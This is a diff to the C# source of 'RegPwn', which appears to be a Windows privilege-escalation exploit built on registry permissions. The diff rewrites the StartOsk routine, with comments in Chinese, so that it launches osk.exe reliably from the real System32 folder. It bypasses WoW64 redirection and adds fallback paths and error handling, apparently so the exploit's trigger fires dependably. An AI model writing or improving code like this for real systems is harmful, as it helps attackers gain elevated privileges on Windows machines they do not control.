@@ -5,6 +5,7 @@ using static RegPwn.WindowsApi;
 using NtApiDotNet;
 using System.Security.AccessControl;
 using Microsoft.Win32;
+using System.IO;
 namespace RegPwn
 {
     public class Program
@@ -178,38 +179,83 @@ namespace RegPwn
 
             return null;
         }
-        public static bool StartOsk()
+
+
+public static bool StartOsk()
+{
+    IntPtr ptr = IntPtr.Zero;
+    try
+    {
+        // 1. 尝试禁用 WoW64 文件系统重定向，这是最可靠的路径访问方式
+        bool isRedirected = false;
+        if (Environment.Is64BitOperatingSystem && !Environment.Is64BitProcess)
         {
-            var shExInfo = new WindowsApi.SHELLEXECUTEINFO
-            {
-                cbSize = Marshal.SizeOf(typeof(WindowsApi.SHELLEXECUTEINFO)),
-                fMask = 0x00000040,
-                hwnd = IntPtr.Zero,
-                lpFile = @"C:\windows\Sysnative\osk.exe",
-                lpParameters = null,
-                lpDirectory = null,
-                nShow = 0,
-                hInstApp = IntPtr.Zero
-            };
-
-            if (ShellExecuteEx(ref shExInfo))
-            {
-                Console.WriteLine("[+] Process created. Sleeping for 5 seconds.");
-                Thread.Sleep(5000);
-
-                if (shExInfo.hProcess != IntPtr.Zero)
-                {
-                    CloseHandle(shExInfo.hProcess);
-                }
-                return true;
-            }
-            else
-            {
-                int errorCode = Marshal.GetLastWin32Error();
-                Console.WriteLine($"[-] Failed to create process: {errorCode}.");
-                return false;
-            }
+            isRedirected = WindowsApi.Wow64DisableWow64FsRedirection(ref ptr);
         }
+
+        // 2. 动态构建路径：始终指向真正的 System32
+        // 在 64位系统上，如果禁用了重定向，System32 就是真正的 System32
+        string windir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
+        string oskPath = Path.Combine(windir, "System32", "osk.exe");
+
+        // 兜底方案：如果禁用失败，尝试使用 Sysnative
+        if (!File.Exists(oskPath))
+        {
+            oskPath = Path.Combine(windir, "Sysnative", "osk.exe");
+        }
+
+        var shExInfo = new WindowsApi.SHELLEXECUTEINFO
+        {
+            cbSize = Marshal.SizeOf(typeof(WindowsApi.SHELLEXECUTEINFO)),
+            // SEE_MASK_NOCLOSEPROCESS (0x40) 以获取 hProcess
+            // SEE_MASK_FLAG_NO_UI (0x400) 避免弹出系统错误弹窗
+            fMask = 0x00000040 | 0x00000400,
+            hwnd = IntPtr.Zero,
+            lpFile = oskPath,
+            lpParameters = null,
+            lpDirectory = null,
+            nShow = 5, // SW_SHOW: 既然要执行OSK，必须显示出来，nShow=0可能导致进程启动后立即退出
+            hInstApp = IntPtr.Zero
+        };
+
+        Console.WriteLine($"[*] Attempting to start: {oskPath}");
+
+        if (WindowsApi.ShellExecuteEx(ref shExInfo))
+        {
+            Console.WriteLine("[+] Process created successfully.");
+            
+            // OSK 有时会由父进程代理启动后立即退出主进程，产生一个子进程
+            // 这里的 Sleep 5秒建议保留，确保 OSK 界面加载完毕
+            Thread.Sleep(5000);
+
+            if (shExInfo.hProcess != IntPtr.Zero)
+            {
+                WindowsApi.CloseHandle(shExInfo.hProcess);
+            }
+            return true;
+        }
+        else
+        {
+            int errorCode = Marshal.GetLastWin32Error();
+            Console.WriteLine($"[-] ShellExecuteEx failed with error code: {errorCode}");
+            return false;
+        }
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"[-] Exception: {ex.Message}");
+        return false;
+    }
+    finally
+    {
+        // 3. 必须恢复重定向，否则后续的系统库加载可能崩溃
+        if (ptr != IntPtr.Zero)
+        {
+            WindowsApi.Wow64RevertWow64FsRedirection(ptr);
+        }
+    }
+}
+		
         public static bool AddRegValue()
         {
             IntPtr hKey;
